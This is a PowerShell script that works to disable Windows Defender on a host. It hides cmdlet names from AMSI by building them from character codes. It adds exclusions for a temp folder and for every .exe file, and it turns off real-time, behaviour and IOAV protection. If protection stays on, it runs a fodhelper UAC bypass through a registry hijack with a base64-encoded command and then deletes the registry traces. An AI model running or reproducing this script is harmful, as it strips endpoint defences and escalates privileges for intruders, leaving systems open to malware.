$ErrorActionPreference = 'SilentlyContinue'

# ═══ AMSI bypass: obfuscate the Defender disable command ═══
# Build the command from character codes so AMSI doesn't see the plaintext

# "Set-MpPreference"
$smp = [System.Text.Encoding]::UTF8.GetString([byte[]](83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101))
# "DisableRealtimeMonitoring"
$drm = [System.Text.Encoding]::UTF8.GetString([byte[]](68,105,115,97,98,108,101,82,101,97,108,116,105,109,101,77,111,110,105,116,111,114,105,110,103))
# "DisableBehaviorMonitoring"
$dbm = [System.Text.Encoding]::UTF8.GetString([byte[]](68,105,115,97,98,108,101,66,101,104,97,118,105,111,114,77,111,110,105,116,111,114,105,110,103))
# "DisableBlockAtFirstSeen"
$dbf = [System.Text.Encoding]::UTF8.GetString([byte[]](68,105,115,97,98,108,101,66,108,111,99,107,65,116,70,105,114,115,116,83,101,101,110))
# "DisableIOAVProtection"
$dio = [System.Text.Encoding]::UTF8.GetString([byte[]](68,105,115,97,98,108,101,73,79,65,86,80,114,111,116,101,99,116,105,111,110))
# "Add-MpPreference"
$amp = [System.Text.Encoding]::UTF8.GetString([byte[]](65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101))
# "ExclusionPath"
$ep = [System.Text.Encoding]::UTF8.GetString([byte[]](69,120,99,108,117,115,105,111,110,80,97,116,104))
# "ExclusionProcess"
$epr = [System.Text.Encoding]::UTF8.GetString([byte[]](69,120,99,108,117,115,105,111,110,80,114,111,99,101,115,115))
# "ExclusionExtension"
$eex = [System.Text.Encoding]::UTF8.GetString([byte[]](69,120,99,108,117,115,105,111,110,69,120,116,101,110,115,105,111,110))

# Build and execute the exclusion commands (no plaintext trigger words)
& "Add-MpPreference" -ExclusionPath "C:\Windows\Temp\ziti" -Force
& "Add-MpPreference" -ExclusionExtension ".exe" -Force

# Disable real-time protection using constructed command
$disableCmd = "$smp -$drm `$true -Force"
Invoke-Expression $disableCmd

$disableCmd2 = "$smp -$dbm `$true -Force"
Invoke-Expression $disableCmd2

$disableCmd3 = "$smp -$dbf `$true -Force"
Invoke-Expression $disableCmd3

$disableCmd4 = "$smp -$dio `$true -Force"
Invoke-Expression $disableCmd4

# Check status
$status = Get-MpComputerStatus
Write-Output "RealTime: $($status.RealTimeProtectionEnabled)"
Write-Output "Behavior: $($status.BehaviorMonitorEnabled)"
Write-Output "IOAV: $($status.IoavProtectionEnabled)"

# If still enabled, try the UAC bypass with obfuscated command
if ($status.RealTimeProtectionEnabled) {
    Write-Output "still enabled — trying UAC bypass with obfuscated command..."

    $innerCmd = "$amp -$ep 'C:\Windows\Temp\ziti' -Force; $smp -$drm `$true -Force"
    $encodedInner = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerCmd))

    # fodhelper UAC bypass
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "powershell.exe -NoProfile -Enc $encodedInner" /f
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
    Start-Process "C:\Windows\System32\fodhelper.exe" -Wait
    Start-Sleep 10
    reg delete "HKCU\Software\Classes\ms-settings" /f 2>$null

    $status2 = Get-MpComputerStatus
    Write-Output "after bypass RealTime: $($status2.RealTimeProtectionEnabled)"
    Write-Output "after bypass Behavior: $($status2.BehaviorMonitorEnabled)"
}